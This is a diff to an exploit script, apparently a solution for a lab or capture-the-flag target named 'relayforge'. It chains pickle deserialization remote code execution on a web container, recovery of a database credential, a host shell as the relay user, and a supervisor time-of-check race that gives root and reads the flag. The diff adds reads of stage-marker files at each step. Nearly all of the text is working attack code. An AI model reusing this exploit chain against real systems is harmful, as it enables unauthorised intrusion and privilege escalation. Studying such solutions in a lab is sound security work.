@@ -28,11 +28,15 @@ GUEST_USER = "guest"
 GUEST_PASSWORD = "guest-relay-2026"
 CRAFTED_OPTIONS = "profile=safe&note=quarterly&profile=legacy"
 ROOT_FLAG_PATH = "/var/lib/relayforge/flag/root.txt"
+WEB_STAGE_PATH = "/opt/relayforge/web/STAGE_1_WEB.txt"
+WORKER_STAGE_PATH = "/var/lib/relayforge/stages/STAGE_2_WORKER.txt"
+ROOT_STAGE_PATH = "/var/lib/relayforge/stages/STAGE_3_ROOT.txt"
 UUID_RE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
 FLAG_RE = re.compile(r"RF\{[0-9a-f]{32}\}")
 WEB_ID_RE = re.compile(r"uid=65532(?:\([^)]*\))?")
 RELAY_ID_RE = re.compile(r"uid=\d+\(relay\)")
 ROOT_UID_PROOF_RE = re.compile(r"(?m)^ROOT_UID=0\r?$")
+ROOT_STAGE_PROOF_RE = re.compile(r"(?m)^ROOT_STAGE=3_UNRESTRICTED_HOST_ROOT\r?$")
 ROOT_FLAG_PROOF_RE = re.compile(r"(?m)^ROOT_FLAG=(RF\{[0-9a-f]{32}\})\r?$")
 LEAK_RE = re.compile(r"worker_shell=(0x[0-9a-fA-F]+)\Z")
 CSRF_RE = re.compile(rb'name="csrf_token" value="([A-Za-z0-9_-]+)"')
@@ -335,7 +339,12 @@ def run(args: argparse.Namespace) -> str:
     required = ("DB_HOST", "DB_NAME", "DB_USER", "DB_PASSWORD")
     if any(not environment.get(key) for key in required) or environment["DB_USER"] != "relay_web":
         raise ChainError("pickle output omitted the restricted relay_web database credential")
-    print("[+] pickle RCE: Web UID 65532; relay_web credential recovered")
+    web_stage = _run_pickle(
+        opener, base, f"cat {shlex.quote(WEB_STAGE_PATH)}", args.http_timeout
+    )
+    if "RELAYFORGE_STAGE=1_WEB_CONTAINER" not in web_stage:
+        raise ChainError("Web RCE could not read its stage marker")
+    print("[+] stage 1 marker: Web UID 65532; relay_web credential recovered")
 
     boundary_python = (
         "import os, psycopg2\n"
@@ -431,14 +440,26 @@ def run(args: argparse.Namespace) -> str:
         identity, identity_rc = _shell_capture(client, "id", args.socket_timeout)
         if identity_rc != 0 or RELAY_ID_RE.search(identity) is None:
             raise ChainError(f"shell did not run as relay: {identity.strip()!r}")
-        print("[+] host shell: uid relay")
+        worker_stage, worker_stage_rc = _shell_capture(
+            client, f"cat {shlex.quote(WORKER_STAGE_PATH)}", args.socket_timeout
+        )
+        if worker_stage_rc != 0 or "RELAYFORGE_STAGE=2_HOST_RELAY_WORKER" not in worker_stage:
+            raise ChainError("relay shell could not read its host Worker stage marker")
+        print("[+] stage 2 marker: host shell is uid relay")
 
         direct_read, direct_rc = _shell_capture(
-            client, f"cat {shlex.quote(ROOT_FLAG_PATH)} 2>&1", args.socket_timeout
+            client,
+            "cat " + shlex.quote(ROOT_STAGE_PATH) + " "
+            + shlex.quote(ROOT_FLAG_PATH) + " 2>&1",
+            args.socket_timeout,
         )
-        if direct_rc == 0 or FLAG_RE.search(direct_read) is not None:
-            raise ChainError("relay could read the root flag directly")
-        print("[+] direct flag read: denied")
+        if (
+            direct_rc == 0
+            or "RELAYFORGE_STAGE=3_UNRESTRICTED_HOST_ROOT" in direct_read
+            or FLAG_RE.search(direct_read) is not None
+        ):
+            raise ChainError("relay could read a root-only marker or flag directly")
+        print("[+] root-only marker and flag: denied to relay")
 
         local_race = Path(__file__).with_name("exploit_supervisor_race.py")
         encoded = base64.b64encode(local_race.read_bytes()).decode("ascii")
@@ -459,16 +480,18 @@ def run(args: argparse.Namespace) -> str:
             args.race_timeout,
         )
         uid_match = ROOT_UID_PROOF_RE.search(race_output)
+        stage_match = ROOT_STAGE_PROOF_RE.search(race_output)
         flag_match = ROOT_FLAG_PROOF_RE.search(race_output)
-        if race_rc != 0 or uid_match is None or flag_match is None:
+        if race_rc != 0 or uid_match is None or stage_match is None or flag_match is None:
             raise ChainError(
-                "Supervisor diagnostic race did not prove uid=0 and return the exact flag "
+                "Supervisor diagnostic race did not prove uid=0, root-marker access, and flag read "
                 f"(rc={race_rc}): {race_output.strip()!r}"
             )
         flag = flag_match.group(1)
         if FLAG_RE.fullmatch(flag) is None:
             raise ChainError("Supervisor diagnostic returned a malformed root flag")
-        print("[+] Supervisor diagnostic TOCTOU: uid=0 execution and root flag obtained")
+        print("[+] stage 3 marker: Supervisor TOCTOU yielded unrestricted host uid=0")
+        print("[+] root flag: obtained from the UID-0 command stream")
         print(flag)
         return flag
     finally:
